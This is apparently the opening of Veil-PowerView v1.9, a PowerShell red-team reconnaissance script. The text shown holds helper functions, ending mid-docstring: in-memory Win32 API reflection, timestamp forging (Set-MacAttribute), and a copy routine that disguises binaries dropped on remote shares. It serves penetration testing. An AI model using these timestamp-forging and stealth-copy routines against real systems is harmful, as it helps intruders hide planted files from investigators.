#requires -version 2

<#

Veil-PowerView v1.9

See README.md for more information.

by @harmj0y
#>


# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


function Get-ShuffledArray {
    <#
        .SYNOPSIS
        Returns a randomly-shuffled version of a passed array.

        .DESCRIPTION
        This function takes an array and returns a randomly-shuffled
        version.

        .PARAMETER Array
        The passed array to shuffle.

        .OUTPUTS
        System.Array. The passed array but shuffled.

        .EXAMPLE
        > $shuffled = Get-ShuffledArray $array
        Get a shuffled version of $array.

        .LINK
        http://sqlchow.wordpress.com/2013/03/04/shuffle-the-deck-using-powershell/
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [Array]$Array
    )
    Begin{}
    Process{
        $len = $Array.Length
        while($len){
            $i = Get-Random ($len --)
            $tmp = $Array[$len]
            $Array[$len] = $Array[$i]
            $Array[$i] = $tmp
        }
        $Array;
    }
}


function Invoke-CheckWrite {
    <#
        .SYNOPSIS
        Check if the current user has write access to a given file.

        .DESCRIPTION
        This function tries to open a given file for writing and then
        immediately closes it, returning true if the file successfully
        opened, and false if it failed.

        .PARAMETER Path
        Path of the file to check for write access.

        .OUTPUTS
        System.bool. True if the add succeeded, false otherwise.

        .EXAMPLE
        > Invoke-CheckWrite "test.txt"
        Check if the current user has write access to "test.txt"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $Path
    )
    Begin{}

    Process{
        try {
            $filetest = [IO.FILE]::OpenWrite($Path)
            $filetest.close()
            $true
        }
        catch {
            Write-Verbose -Message $Error[0]
            $false
        }
    }

    End{}
}


# stolen directly from http://poshcode.org/1590
<#
  This Export-CSV behaves exactly like native Export-CSV
  However it has one optional switch -Append
  Which lets you append new data to existing CSV file: e.g.
  Get-Process | Select ProcessName, CPU | Export-CSV processes.csv -Append

  For details, see
  http://dmitrysotnikov.wordpress.com/2010/01/19/export-csv-append/

  (c) Dmitry Sotnikov
#>
function Export-CSV {
    [CmdletBinding(DefaultParameterSetName='Delimiter',
            SupportsShouldProcess=$true,
    ConfirmImpact='Medium')]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$true, Position=0)]
        [Alias('PSPath')]
        [System.String]
        $Path,

        #region -Append (added by Dmitry Sotnikov)
        [Switch]
        $Append,
        #endregion

        [Switch]
        $Force,

        [Switch]
        $NoClobber,

        [ValidateSet('Unicode','UTF7','UTF8','ASCII','UTF32','BigEndianUnicode','Default','OEM')]
        [System.String]
        $Encoding,

        [Parameter(ParameterSetName='Delimiter', Position=1)]
        [ValidateNotNull()]
        [System.Char]
        $Delimiter,

        [Parameter(ParameterSetName='UseCulture')]
        [Switch]
        $UseCulture,

        [Alias('NTI')]
        [Switch]
        $NoTypeInformation
    )

    Begin
    {
        # This variable will tell us whether we actually need to append
        # to existing file
        $AppendMode = $false

        try {
            $outBuffer = $null
            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
            {
                $PSBoundParameters['OutBuffer'] = 1
            }
            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Export-Csv',
            [System.Management.Automation.CommandTypes]::Cmdlet)


            #String variable to become the target command line
            $scriptCmdPipeline = ''

            # Add new parameter handling
            #region Dmitry: Process and remove the Append parameter if it is present
            if ($Append) {

                $PSBoundParameters.Remove('Append') | Out-Null

                if ($Path) {
                    if (Test-Path -Path $Path) {
                        # Need to construct new command line
                        $AppendMode = $true

                        if ($Encoding.Length -eq 0) {
                            # ASCII is default encoding for Export-CSV
                            $Encoding = 'ASCII'
                        }

                        # For Append we use ConvertTo-CSV instead of Export
                        $scriptCmdPipeline += 'ConvertTo-Csv -NoTypeInformation '

                        # Inherit other CSV convertion parameters
                        if ( $UseCulture ) {
                            $scriptCmdPipeline += ' -UseCulture '
                        }

                        if ( $Delimiter ) {
                            $scriptCmdPipeline += " -Delimiter '$Delimiter' "
                        }

                        # Skip the first line (the one with the property names)
                        $scriptCmdPipeline += ' | Foreach-Object {$start=$true}'
                        $scriptCmdPipeline += '{if ($start) {$start=$false} else {$_}} '

                        # Add file output
                        $scriptCmdPipeline += " | Out-File -FilePath '$Path' -Encoding '$Encoding' -Append "

                        if ($Force) {
                            $scriptCmdPipeline += ' -Force'
                        }

                        if ($NoClobber) {
                            $scriptCmdPipeline += ' -NoClobber'
                        }
                    }
                }
            }
            $scriptCmd = {& $wrappedCmd @PSBoundParameters }

            if ( $AppendMode ) {
                # redefine command line
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    $scriptCmdPipeline
                )
            } else {
                # execute Export-CSV as we got it because
                # either -Append is missing or file does not exist
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    [string]$scriptCmd
                )
            }

            # standard pipeline initialization
            $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
            $steppablePipeline.Begin($PSCmdlet)

        }
        catch {
            throw
        }
    }

    process
    {
        try {
            $steppablePipeline.Process($_)
        } catch {
            throw
        }
    }

    end
    {
        try {
            $steppablePipeline.End()
        } catch {
            throw
        }
    }
<#

.ForwardHelpTargetName Export-Csv
.ForwardHelpCategory Cmdlet

#>

}


# from  https://gist.github.com/mdnmdn/6936714
function Escape-JSONString($str){
    if ($str -eq $null) {return ""}
    $str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
    return $str;
}

function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
    begin {
        $data = @()
    }
    process{
        $data += $_
    }
    
    end{
    
        if ($data.length -eq 1 -and $forceArray -eq $false) {
            $value = $data[0]
        } else {    
            $value = $data
        }

        if ($value -eq $null) {
            return "null"
        }

        $dataType = $value.GetType().Name
        
        switch -regex ($dataType) {
                'String'  {
                    return  "`"{0}`"" -f (Escape-JSONString $value )
                }
                '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
                'Int32|Double' {return  "$value"}
                'Boolean' {return  "$value".ToLower()}
                '(System\.)?Object\[\]' { # array
                    
                    if ($maxDepth -le 0){return "`"$value`""}
                    
                    $jsonResult = ''
                    foreach($elem in $value){
                        #if ($elem -eq $null) {continue}
                        if ($jsonResult.Length -gt 0) {$jsonResult +=', '}              
                        $jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
                    }
                    return "[" + $jsonResult + "]"
                }
                '(System\.)?Hashtable' { # hashtable
                    $jsonResult = ''
                    foreach($key in $value.Keys){
                        if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
                        $jsonResult += 
@"
    "{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
                    }
                    return "{" + $jsonResult + "}"
                }
                default { #object
                    if ($maxDepth -le 0){return  "`"{0}`"" -f (Escape-JSONString $value)}
                    
                    return "{" +
                        (($value | Get-Member -MemberType *property | % { 
@"
    "{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )           
                    
                    }) -join ', ') + "}"
                }
        }
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
    .SYNOPSIS

        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

        PowerSploit Function: Set-MacAttribute
        Author: Chris Campbell (@obscuresec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        Version: 1.0.0

    .DESCRIPTION

        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

    .LINK

        http://www.obscuresec.com/2014/05/touch.html
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)){Throw 'File Not Found'}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }

    #test and set variables
    if (!(Test-Path -Path $FilePath)){Throw "$FilePath not found"}

    $FileInfoObject = (Get-Item -Path $FilePath)

    if ($PSBoundParameters['AllMacAttributes']){
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']){

        if (!(Test-Path -Path $OldFilePath)){Write-Error "$OldFilePath not found."}

        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Invoke-CopyFile {
    <#
        .SYNOPSIS
        Copy a source file to a destination location, matching any MAC
        properties as appropriate.

        .PARAMETER SourceFile
        Source file to copy.

        .PARAMETER DestFile
        Destination file path to copy file to.

        .EXAMPLE
        > Invoke-CopyFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
        Copy the local program.exe binary to a remote location,
        matching the MAC properties of the remote exe.

        .LINK
        http://obscuresecurity.blogspot.com/2014/05/touch.html
    #>

    param(
        [Parameter(Mandatory = $True)]
        [String]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        $DestFile
    )

    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile

    # copy the file off
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-HostIP {
    <#
    .SYNOPSIS
    Takes a hostname and resolves it an IP.

    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.

    .OUTPUTS
    System.String. The IPv4 address.

    .EXAMPLE
    > Get-HostIP -hostname SERVER
    Return the IPv4 address of 'SERVER'
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [string]
        $hostname = ''
    )
    process {
        try{
            # get the IP resolution of this specified hostname
            $results = @(([net.dns]::GetHostEntry($hostname)).AddressList)

            if ($results.Count -ne 0){
                foreach ($result in $results) {
                    # make sure the returned result is IPv4
                    if ($result.AddressFamily -eq 'InterNetwork') {
                        $result.IPAddressToString
                    }
                }
            }
        }
        catch{
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


# adapted from RamblingCookieMonster's code at
# https://github.com/RamblingCookieMonster/PowerShell/blob/master/Invoke-Ping.ps1
function Invoke-Ping {
<#
.SYNOPSIS
    Ping systems in parallel
    Author: RamblingCookieMonster
    
.PARAMETER ComputerName
    One or more computers to test

.PARAMETER Timeout
    Time in seconds before we attempt to dispose an individual query.  Default is 20

.PARAMETER Throttle
    Throttle query to this many parallel runspaces.  Default is 100.

.PARAMETER NoCloseOnTimeout
    Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out

    This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.

.EXAMPLE
